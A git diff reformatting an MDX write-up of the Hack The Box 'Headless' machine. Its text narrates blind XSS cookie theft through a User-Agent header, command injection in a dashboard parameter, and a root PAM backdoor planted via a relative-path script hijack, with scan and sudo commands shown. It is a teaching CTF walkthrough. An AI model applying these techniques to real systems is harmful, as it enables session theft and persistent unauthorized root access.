@@ -26,12 +26,37 @@ url: "https://asbawy.github.io/writeups/htb-headless"
 import { Callout } from "@/components/Callout";
 import { KillChain, SpoilerFlag } from "@/components/cyber/WriteupComponents";
 
-<KillChain steps={[
-  { phase: "Reconnaissance", title: "Port Scanning & Web Enumeration", desc: "Nmap scan revealed SSH (22) and a Werkzeug Python web app on port 5000. Directory fuzzing uncovered /dashboard (401) and /support (contact form).", tools: ["Nmap", "Gobuster", "curl"] },
-  { phase: "Foothold", title: "Blind XSS — Admin Cookie Exfiltration", desc: "Triggered hacking detection by injecting XSS in the message body, while the real XSS payload in the User-Agent header stole the admin's is_admin cookie when the admin reviewed the flagged request.", technique: "Blind XSS via Header Injection", tools: ["curl", "Python HTTP Server"] },
-  { phase: "Remote Execution", title: "Command Injection in Dashboard", desc: "Used the stolen admin cookie to access /dashboard. The date parameter in the report generator was passed directly to a system command, allowing arbitrary command execution as dvir.", technique: "OS Command Injection", tools: ["curl", "bash"] },
-  { phase: "PrivEsc", title: "Sudo Script — PAM Backdoor Injection", desc: "dvir could run /usr/bin/syscheck as root via sudo. The script called ./initdb.sh using a relative path. Created a malicious initdb.sh that injects pam_permit.so into /etc/pam.d/su, then used su to escalate to root with any password.", technique: "PAM Authentication Backdoor via Relative Path Hijack", tools: ["sudo", "bash", "sed"] }
-]} />
+<KillChain
+  steps={[
+    {
+      phase: "Reconnaissance",
+      title: "Port Scanning & Web Enumeration",
+      desc: "Nmap scan revealed SSH (22) and a Werkzeug Python web app on port 5000. Directory fuzzing uncovered /dashboard (401) and /support (contact form).",
+      tools: ["Nmap", "Gobuster", "curl"],
+    },
+    {
+      phase: "Foothold",
+      title: "Blind XSS — Admin Cookie Exfiltration",
+      desc: "Triggered hacking detection by injecting XSS in the message body, while the real XSS payload in the User-Agent header stole the admin's is_admin cookie when the admin reviewed the flagged request.",
+      technique: "Blind XSS via Header Injection",
+      tools: ["curl", "Python HTTP Server"],
+    },
+    {
+      phase: "Remote Execution",
+      title: "Command Injection in Dashboard",
+      desc: "Used the stolen admin cookie to access /dashboard. The date parameter in the report generator was passed directly to a system command, allowing arbitrary command execution as dvir.",
+      technique: "OS Command Injection",
+      tools: ["curl", "bash"],
+    },
+    {
+      phase: "PrivEsc",
+      title: "Sudo Script — PAM Backdoor Injection",
+      desc: "dvir could run /usr/bin/syscheck as root via sudo. The script called ./initdb.sh using a relative path. Created a malicious initdb.sh that injects pam_permit.so into /etc/pam.d/su, then used su to escalate to root with any password.",
+      technique: "PAM Authentication Backdoor via Relative Path Hijack",
+      tools: ["sudo", "bash", "sed"],
+    },
+  ]}
+/>
 
 ---
 
@@ -54,7 +79,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 <Callout type="info">
-Only two ports open — SSH and a Python Werkzeug web application on port 5000. The Werkzeug framework hints at a Flask-based application.
+  Only two ports open — SSH and a Python Werkzeug web application on port 5000. The Werkzeug
+  framework hints at a Flask-based application.
 </Callout>
 
 ### Web Enumeration
@@ -63,17 +89,18 @@ Browsing to `http://10.129.41.89:5000` shows an "Under Construction" countdown p
 
 ![Homepage countdown page](https://i.imgur.com/P7mMA4Y.png)
 
-
 ```bash
 gobuster dir -u http://10.129.41.89:5000 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 ```
 
 Key findings:
+
 - `/dashboard` — returns **401 Unauthorized** (requires `is_admin` cookie)
 - `/support` — public contact form with fields: first name, last name, email, phone, message
 
 <Callout type="warning">
-The application sets a cookie `is_admin=InVzZXIi...` (base64 of "user") without the `HttpOnly` flag, making it vulnerable to JavaScript-based cookie theft.
+  The application sets a cookie `is_admin=InVzZXIi...` (base64 of "user") without the `HttpOnly`
+  flag, making it vulnerable to JavaScript-based cookie theft.
 </Callout>
 
 ![Support contact form](https://i.imgur.com/v1dGIz7.png)
@@ -105,7 +132,10 @@ curl -X POST http://10.129.41.89:5000/support \
 ```
 
 <Callout type="info">
-**Why this works:** The message body `<script>test</script>` triggers the hacking detection system. The admin bot reviews the flagged request and renders the page containing all request headers — including our malicious User-Agent. Since the `is_admin` cookie lacks the `HttpOnly` flag, `document.cookie` captures it and sends it to our listener.
+  **Why this works:** The message body `<script>test</script>` triggers the hacking detection
+  system. The admin bot reviews the flagged request and renders the page containing all request
+  headers — including our malicious User-Agent. Since the `is_admin` cookie lacks the `HttpOnly`
+  flag, `document.cookie` captures it and sends it to our listener.
 </Callout>
 
 ### Step 4: Receive the Admin Cookie
@@ -119,7 +149,9 @@ Within seconds, the admin bot triggers the XSS and we receive a callback:
 **Stolen cookie:** `is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0`
 
 <Callout type="info">
-Decoding the cookie value: `ImFkbWluIg` is base64 for `"admin"` — the original user cookie was `InVzZXIi` (base64 for `"user"`). The application uses a signed cookie with a Flask itsdangerous token.
+  Decoding the cookie value: `ImFkbWluIg` is base64 for `"admin"` — the original user cookie was
+  `InVzZXIi` (base64 for `"user"`). The application uses a signed cookie with a Flask itsdangerous
+  token.
 </Callout>
 
 ---
@@ -150,6 +182,7 @@ curl -s http://10.129.41.89:5000/dashboard \
 ```
 
 **Output:**
+
 ```
 uid=1000(dvir) gid=1000(dvir) groups=1000(dvir),100(users)
 ```
@@ -228,7 +261,9 @@ exit 0
 ```
 
 <Callout type="warning">
-**Vulnerability:** The script calls `./initdb.sh` using a **relative path**. Since syscheck runs as root via sudo, if we control the current working directory and place a malicious `initdb.sh` there, it will be executed as root.
+  **Vulnerability:** The script calls `./initdb.sh` using a **relative path**. Since syscheck runs
+  as root via sudo, if we control the current working directory and place a malicious `initdb.sh`
+  there, it will be executed as root.
 </Callout>
 
 ### Exploitation — PAM Backdoor Injection via Relative Path Hijack
@@ -247,7 +282,10 @@ dvir@headless:~$ chmod +x initdb.sh
 ```
 
 <Callout type="info">
-**Why PAM?** The `pam_permit.so` module unconditionally succeeds authentication. By inserting it as the first `auth` rule with `sufficient`, PAM short-circuits — it never reaches the real password check. Unlike SUID bash, this leaves no suspicious file permissions behind and survives reboots.
+  **Why PAM?** The `pam_permit.so` module unconditionally succeeds authentication. By inserting it
+  as the first `auth` rule with `sufficient`, PAM short-circuits — it never reaches the real
+  password check. Unlike SUID bash, this leaves no suspicious file permissions behind and survives
+  reboots.
 </Callout>
 
 **Step 2:** Trigger the payload — run syscheck from our home directory where `./initdb.sh` resolves to our backdoor:
@@ -257,6 +295,7 @@ dvir@headless:~$ sudo /usr/bin/syscheck
 ```
 
 **Output:**
+
 ```bash
 Last Kernel Modification Time: 01/02/2024 10:05
 Available disk space: 2.0G
@@ -284,7 +323,9 @@ a244939a6b0c136f7b53d76e1dee9f9f
 <SpoilerFlag label="Root Flag" flag="a244939a6b0c136f7b53d76e1dee9f9f" />
 
 <Callout type="warning">
-**Why this is dangerous in the real world:** A PAM backdoor is persistent — it survives across reboots and doesn't show up in typical checks like `find / -perm -4000` (SUID hunting) or process monitoring. It only becomes visible if an admin audits `/etc/pam.d/` configs directly.
+  **Why this is dangerous in the real world:** A PAM backdoor is persistent — it survives across
+  reboots and doesn't show up in typical checks like `find / -perm -4000` (SUID hunting) or process
+  monitoring. It only becomes visible if an admin audits `/etc/pam.d/` configs directly.
 </Callout>
 
 ---
